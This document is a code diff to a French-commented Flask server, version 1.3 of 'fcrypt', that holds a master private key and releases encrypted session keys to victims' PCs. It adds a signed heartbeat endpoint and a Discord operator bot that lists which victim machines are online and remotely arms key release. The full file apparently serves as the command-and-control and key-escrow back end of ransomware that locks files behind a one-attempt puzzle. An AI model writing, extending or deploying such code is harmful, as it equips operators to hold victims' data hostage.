@@ -1,11 +1,26 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-server.py — Serveur de validation pour Render (v1.2, durci).
+server.py — Serveur de validation pour Render (v1.3) + BOT DISCORD opérateur.
 Garde master.key, valide la réponse, renvoie la session_key CHIFFRÉE.
 
 Sur Render : ce fichier s'appelle déjà « server.py » → Start Command inchangée :
     gunicorn server:app --bind 0.0.0.0:$PORT
+(le bot Discord démarre en thread à l'import du module — garder 1 worker).
+
+NOUVEAUTÉS v1.3 (bot Discord + récupération d'urgence + lien opérateur) :
+  - POST /poll : heartbeat signé MAC (info=b"poll") envoyé périodiquement par
+    le PC pendant la phase active → alimente !list (script ouvert = en ligne).
+  - Récupération d'urgence : !recovery <id> (bot) arme un drapeau one-shot
+    (TTL RECOVERY_TTL) ; au prochain /poll valide, le serveur ouvre
+    l'enveloppe (même chemin crypto que /unlock) et renvoie la session_key
+    CHIFFRÉE — le PC de la victime affiche la progression du déchiffrement
+    en % dans l'interface du mini-jeu. Le bot ne fait qu'ARMER le drapeau :
+    il ne peut JAMAIS obtenir de clé lui-même (le secret ECDH n'existe que
+    dans la RAM du processus de la victime).
+  - Bot Discord hébergé DANS CE FICHIER (thread dédié, à côté de Flask) :
+    préfixe « ! », commandes !help / !list / !recovery, réservées aux
+    DISCORD_ADMIN_IDS (vide = aucune commande servie).
 
 NOUVEAUTÉS v1.2 (fix « Not Found / 404 » sur le site et chez cron-job.org) :
   - GET / répond désormais {"status": "ok", ...} : la racine du service ne
@@ -44,13 +59,29 @@ Endpoints :
                   → 200 {"status":"ok","session_key_enc","nonce"}
                   | 403 {"status":"wrong"} / {"status":"locked_out"}
                   | 400/403 {"status":"error","reason":...} (générique)
+  POST /poll    → {machine_id, envelope, nonce, ts, mac}  (MAC info=b"poll")
+                  → 200 {"status":"ok"}
+                  | 200 {"status":"ok","recovery":{"session_key_enc","nonce"}}
+                    si une récupération d'urgence est armée (one-shot)
+                  | 403 replay / bad_mac / stale_request
+
+Bot Discord (même fichier, thread dédié, prefix "!") :
+  !help            aide (admin only)
+  !list            machines connues : ✅ en ligne (script ouvert, heartbeat
+                   frais ≤ HEARTBEAT_TTL s) / ❌ hors ligne
+  !recovery <id>   arme la récupération d'urgence de la machine <id>
 
 Variables d'environnement (Render → Environment) :
-  MASTER_KEY_B64   clé privée X25519 en base64 (générée à l'étape 1 du tuto)
-  GOOD_ANSWER      réponse attendue (défaut "2")
-  MAX_ATTEMPTS     nombre max d'essais par machine ET par enveloppe (défaut 1)
-  STATE_FILE       chemin du fichier d'état (défaut /tmp/fcrypt_state.json)
-  PORT             port d'écoute (Render injecte $PORT, défaut 10000)
+  MASTER_KEY_B64      clé privée X25519 en base64 (générée à l'étape 1 du tuto)
+  GOOD_ANSWER         réponse attendue (défaut "2")
+  MAX_ATTEMPTS        nombre max d'essais par machine ET par enveloppe (défaut 1)
+  STATE_FILE          chemin du fichier d'état (défaut /tmp/fcrypt_state.json)
+  DISCORD_BOT_TOKEN   token du bot Discord (vide = pas de bot)
+  DISCORD_ADMIN_IDS   IDs Discord opérateurs, séparés par des virgules
+                      (vide = AUCUNE commande servie)
+  HEARTBEAT_TTL       seuil « en ligne » pour !list en secondes (défaut 90)
+  RECOVERY_TTL        durée de vie d'un drapeau de recovery en secondes (défaut 3600)
+  PORT                port d'écoute (Render injecte $PORT, défaut 10000)
 """
 
 import os
@@ -82,6 +113,10 @@ MAX_ATTEMPTS = int(os.environ.get("MAX_ATTEMPTS", "1"))
 STATE_FILE = Path(os.environ.get("STATE_FILE", "/tmp/fcrypt_state.json"))
 TS_WINDOW = 300          # fenêtre anti-rejeu (±5 min)
 ENVELOPE_MAX = 16384     # taille max d'une enveloppe décodée (octets)
+HEARTBEAT_TTL = int(os.environ.get("HEARTBEAT_TTL", "90"))
+RECOVERY_TTL = int(os.environ.get("RECOVERY_TTL", "3600"))
+DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "")
+DISCORD_ADMIN_IDS = {s.strip() for s in os.environ.get("DISCORD_ADMIN_IDS", "").split(",") if s.strip()}
 
 if not MASTER_KEY_B64:
     raise RuntimeError("MASTER_KEY_B64 manquant")
@@ -204,6 +239,65 @@ def _encrypt_response(session_key: bytes, shared: bytes, salt: bytes):
     return ct.hex(), nonce.hex()
 
 
+def _poll_mac(shared: bytes, salt: bytes, machine_id: str, nonce: str,
+              ts: str, env_h: str) -> str:
+    """MAC attendu sur /poll : clé HKDF info=b'poll' (domaine distinct du
+    MAC /unlock), couvre machine_id, nonce, ts et le hash de l'enveloppe."""
+    key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
+               info=b"poll").derive(shared)
+    msg = "\n".join([machine_id, nonce, ts, env_h]).encode("utf-8")
+    return hmac.new(key, msg, hashlib.sha256).hexdigest()
+
+
+def _seen_nonce(machine_id: str, nonce: str) -> bool:
+    """Anti-rejeu /poll : True si le nonce a DÉJÀ été vu (cache purgé de la
+    fenêtre TS_WINDOW). Le MAC étant vérifié AVANT, un faux MAC ne consomme
+    jamais rien."""
+    now = time.time()
+    with _state_lock:
+        k = "n:" + machine_id
+        cache = {n: t for n, t in STATE.get(k, {}).items() if now - t <= TS_WINDOW}
+        replay = nonce in cache
+        cache[nonce] = now
+        STATE[k] = cache
+        _save_state(STATE)
+        return replay
+
+
+def _heartbeat_seen(machine_id: str):
+    """Marque la machine « vue » (script ouvert) pour la commande !list."""
+    with _state_lock:
+        STATE.setdefault("h:" + machine_id, {})['last_seen'] = time.time()
+        _save_state(STATE)
+
+
+def _arm_recovery(machine_id: str) -> bool:
+    """Arme le drapeau de récupération d'urgence (one-shot, TTL).
+    Retourne True si la machine était déjà connue du serveur."""
+    with _state_lock:
+        known = any((p + machine_id) in STATE for p in ("h:", "m:", "r:"))
+        STATE["r:" + machine_id] = {"pending": True, "issued_ts": time.time()}
+        _save_state(STATE)
+    return known
+
+
+def _take_recovery(machine_id: str):
+    """Consomme le drapeau de récupération (une seule fois) et le renvoie,
+    ou None s'il est absent / déjà consommé / expiré (RECOVERY_TTL)."""
+    with _state_lock:
+        r = STATE.get("r:" + machine_id)
+        if not r or not r.get("pending"):
+            return None
+        if time.time() - float(r.get("issued_ts", 0)) > RECOVERY_TTL:
+            STATE.pop("r:" + machine_id, None)
+            _save_state(STATE)
+            return None
+        r["pending"] = False
+        r["granted_ts"] = time.time()
+        _save_state(STATE)
+        return r
+
+
 @app.route("/health", methods=["GET"])
 def health():
     return jsonify({"status": "ok", "service": "fcrypt-server"}), 200
@@ -213,7 +307,7 @@ def health():
 def root():
     """Ping racine : navigateur, cron-job.org et health-check Render
     (HEAD / inclus, géré automatiquement). JSON minuscule, aucun secret."""
-    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.2"}), 200
+    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.3"}), 200
 
 
 # ── Erreurs HTTP en JSON minuscule (jamais les pages HTML de Flask) ──
@@ -326,6 +420,169 @@ def unlock():
         "session_key_enc": enc_hex,
         "nonce": nonce_hex,
     }), 200
+
+
+@app.route("/poll", methods=["POST"])
+def poll():
+    """Heartbeat signé du PC (lien opérateur) + remise du grant de
+    récupération d'urgence. Même discipline que /unlock : formats stricts,
+    MAC obligatoire AVANT toute écriture d'état, anti-rejeu par nonce."""
+    ip = _client_ip()
+    try:
+        req = request.get_json(force=True, silent=True) or {}
+    except Exception:
+        return jsonify({"status": "error", "reason": "bad_json"}), 400
+
+    machine_id = str(req.get("machine_id", "")).strip().lower()
+    envelope = str(req.get("envelope", "")).strip()
+    nonce = str(req.get("nonce", "")).strip().lower()
+    ts = str(req.get("ts", "")).strip()
+    mac = str(req.get("mac", "")).strip().lower()
+
+    if not machine_id or not envelope or not nonce or not ts or not mac:
+        return jsonify({"status": "error", "reason": "missing_fields"}), 400
+    if (not re.fullmatch(r"[0-9a-f]{8,64}", machine_id)
+            or not re.fullmatch(r"[0-9a-f]{32}", nonce)
+            or not re.fullmatch(r"\d{1,16}", ts)
+            or not re.fullmatch(r"[0-9a-f]{64}", mac)
+            or len(envelope) > 22000):
+        return jsonify({"status": "error", "reason": "bad_fields"}), 400
+
+    env_h = _env_hash(envelope)
+    try:
+        eph_pub, salt, nonce_env, ct = _parse_envelope(envelope)
+        shared = MASTER_PRIV.exchange(eph_pub)
+    except Exception as e:
+        app.logger.warning("poll bad_envelope ip=%s err=%s", ip, e)
+        return jsonify({"status": "error", "reason": "bad_envelope"}), 400
+
+    if not hmac.compare_digest(_poll_mac(shared, salt, machine_id, nonce, ts, env_h), mac):
+        app.logger.warning("poll bad_mac ip=%s machine=%s", ip, machine_id[:8])
+        return jsonify({"status": "error", "reason": "bad_mac"}), 403
+
+    try:
+        ts_int = int(ts)
+    except ValueError:
+        return jsonify({"status": "error", "reason": "bad_fields"}), 400
+    if abs(time.time() - ts_int) > TS_WINDOW:
+        app.logger.warning("poll stale ip=%s machine=%s", ip, machine_id[:8])
+        return jsonify({"status": "error", "reason": "stale_request"}), 403
+    if _seen_nonce(machine_id, nonce):
+        app.logger.warning("poll replay ip=%s machine=%s", ip, machine_id[:8])
+        return jsonify({"status": "error", "reason": "replay"}), 403
+
+    _heartbeat_seen(machine_id)
+
+    rec = _take_recovery(machine_id)
+    if rec is None:
+        return jsonify({"status": "ok"}), 200
+
+    # Récupération d'urgence armée par l'opérateur (!recovery) : même chemin
+    # crypto que /unlock — ouverture authentifiée de l'enveloppe (GCM),
+    # réponse chiffrée (info=b"response"). Si l'ouverture échoue, on ré-arme
+    # le drapeau pour que le prochain /poll retente.
+    try:
+        session_key = _open_envelope(shared, salt, nonce_env, ct)
+    except Exception as e:
+        app.logger.warning("poll recovery gcm_fail ip=%s machine=%s err=%s",
+                           ip, machine_id[:8], e)
+        _arm_recovery(machine_id)
+        return jsonify({"status": "error", "reason": "bad_envelope"}), 400
+
+    enc_hex, nonce_hex = _encrypt_response(session_key, shared, salt)
+    session_key = b"\x00" * 32
+    del session_key
+    app.logger.info("poll recovery GRANTED ip=%s machine=%s", ip, machine_id[:8])
+    return jsonify({"status": "ok",
+                    "recovery": {"session_key_enc": enc_hex, "nonce": nonce_hex}}), 200
+
+
+# ════════════════════════════════════════════════════════════════════════
+# ── BOT DISCORD OPÉRATEUR (hébergé DANS CE FICHIER, à côté de Flask) ──
+# ════════════════════════════════════════════════════════════════════════
+# Sécurité : les commandes sont réservées aux DISCORD_ADMIN_IDS (vide =
+# aucune commande servie). Le bot ne fait qu'ARMER un drapeau one-shot —
+# la clé ne part QUE vers un /poll signé MAC (secret ECDH en RAM victime
+# uniquement) et y arrive CHIFFRÉE. Le bot ne peut jamais obtenir de clé.
+
+
+def _discord_bot_main(token: str):
+    try:
+        import discord
+        from discord.ext import commands
+    except Exception as e:
+        print(f"[bot] discord.py indisponible ({e}) — pip install discord.py")
+        return
+    intents = discord.Intents.default()
+    intents.message_content = True
+    bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
+
+    @bot.event
+    async def on_ready():
+        print(f"[bot] connecté : {bot.user} (id={bot.user.id})")
+
+    def _admin(ctx) -> bool:
+        return str(ctx.author.id) in DISCORD_ADMIN_IDS
+
+    @bot.command(name="help")
+    async def _help_cmd(ctx):
+        if not _admin(ctx):
+            await ctx.send("⛔ Accès refusé.")
+            return
+        await ctx.send(
+            "**Commandes opérateur** (réservées aux IDs autorisés)\n"
+            "`!list` — machines connues : ✅ en ligne (script ouvert) / ❌ hors ligne\n"
+            "`!recovery <id>` — récupération d'urgence : le PC affiche la progression "
+            "du déchiffrement en % dans l'interface du mini-jeu\n"
+            "`!help` — cette aide")
+
+    @bot.command(name="list")
+    async def _list_cmd(ctx):
+        if not _admin(ctx):
+            await ctx.send("⛔ Accès refusé.")
+            return
+        now = time.time()
+        with _state_lock:
+            mids = sorted({k[2:] for k in STATE if k[:2] in ("h:", "m:")})
+            snap = {k: dict(v) for k, v in STATE.items() if k[:2] in ("h:", "r:")
+                    and isinstance(v, dict)}
+        if not mids:
+            await ctx.send("Aucune machine connue — aucune enveloppe reçue à ce jour.")
+            return
+        lines = []
+        for mid in mids[:40]:
+            hs = float(snap.get("h:" + mid, {}).get("last_seen", 0))
+            online = bool(hs) and (now - hs) <= HEARTBEAT_TTL
+            ago = "jamais vu" if not hs else f"vu il y a {int(now - hs)} s"
+            flag = " — ⏳ recovery armé" if snap.get("r:" + mid, {}).get("pending") else ""
+            lines.append(f"{'✅' if online else '❌'} `{mid}` — {ago}{flag}")
+        body = "\n".join(lines)
+        await ctx.send((f"**Machines ({len(mids)})**\n{body}")[:1900])
+
+    @bot.command(name="recovery")
+    async def _recovery_cmd(ctx, mid: str = ""):
+        if not _admin(ctx):
+            await ctx.send("⛔ Accès refusé.")
+            return
+        mid = mid.strip().lower()
+        if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
+            await ctx.send("Usage : `!recovery <machine_id>` — récupérez l'id avec `!list`.")
+            return
+        known = _arm_recovery(mid)
+        if known:
+            await ctx.send(f"🛠 Récupération armée pour `{mid}` — le déchiffrement démarrera au "
+                           f"prochain poll du PC (≤ ~10 s) et la progression s'affichera en % "
+                           f"sur son écran (interface du mini-jeu).")
+        else:
+            await ctx.send(f"⚠️ `{mid}` inconnue du serveur — drapeau armé quand même, mais il "
+                           f"ne sera consommé que si ce PC poll réellement.")
+
+    bot.run(token)
+
+
+if DISCORD_BOT_TOKEN:
+    threading.Thread(target=_discord_bot_main, args=(DISCORD_BOT_TOKEN,), daemon=True).start()
+    print("[bot] thread Discord démarré")
 
 
 if __name__ == "__main__":
